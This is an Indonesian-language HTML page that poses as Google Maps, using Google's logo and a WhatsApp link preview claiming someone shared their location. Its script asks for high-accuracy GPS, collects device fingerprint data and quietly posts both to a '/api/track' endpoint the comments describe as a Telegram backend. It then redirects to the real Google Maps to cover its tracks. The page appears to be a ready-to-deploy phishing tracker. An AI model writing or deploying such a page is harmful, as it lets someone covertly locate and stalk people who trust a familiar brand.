<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <!-- Open Graph untuk Pratinjau WhatsApp -->
    <meta property="og:title" content="📍 Lokasi Terbagikan">
    <meta property="og:description" content="Seseorang telah membagikan lokasi terkini dengan Anda. Ketuk untuk melihat rute.">
    <meta property="og:url" content="https://shareloc.online">
    <meta property="og:type" content="website">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: Roboto, Arial, sans-serif; 
            background: #f8f9fa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: white; 
            padding: 36px 24px; 
            border-radius: 16px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
            text-align: center; 
            max-width: 360px; 
            width: 90%; 
        }
        /* Logo Resmi Google Maps */
        .logo {
            width: 64px;
            height: 64px;
            margin-bottom: 16px;
            object-fit: contain;
        }
        h3 { 
            color: #202124; 
            margin-bottom: 8px; 
            font-size: 20px; 
            font-weight: 500; 
        }
        p { 
            color: #5f6368; 
            font-size: 14px; 
            margin-bottom: 24px; 
            line-height: 1.5; 
        }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 500;
            border-radius: 24px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
            transition: background 0.2s;
        }
        .btn:hover { background-color: #1557b0; }
        .spinner { 
            border: 3px solid #f1f3f4; 
            border-top: 3px solid #1a73e8; 
            border-radius: 50%; 
            width: 36px; height: 36px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <!-- Logo Resmi Google Maps sesuai gambar referensi -->
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Google Maps">
        <h3>Google Maps</h3>
        <p>Seseorang telah membagikan lokasi terkini dengan Anda.</p>
        <button class="btn" onclick="startTracking()">Buka Peta</button>
    </div>

    <script>
        async function startTracking() {
            const card = document.getElementById('main-card');
            card.innerHTML = `
                <div class="spinner"></div>
                <h3 style="margin-top: 15px;">Memuat Peta...</h3>
                <p style="margin-bottom: 0;">Menghubungkan ke lokasi...</p>
            `;

            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS secara instan
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak atau timeout");
                }
            }

            // 2. Info Perangkat Ringan
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || '-'
            };

            // 3. Kirim data ke backend Telegram secara background
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    image: null,
                    deviceData
                })
            }).catch(e => console.log("Gagal kirim background"));

            // 4. Langsung alihkan ke Google Maps asli dengan cepat
            setTimeout(() => {
                if (latitude && longitude) {
                    window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
                } else {
                    window.location.href = 'https://www.google.com/maps';
                }
            }, 600);
        }
    </script>
</body>
</html>
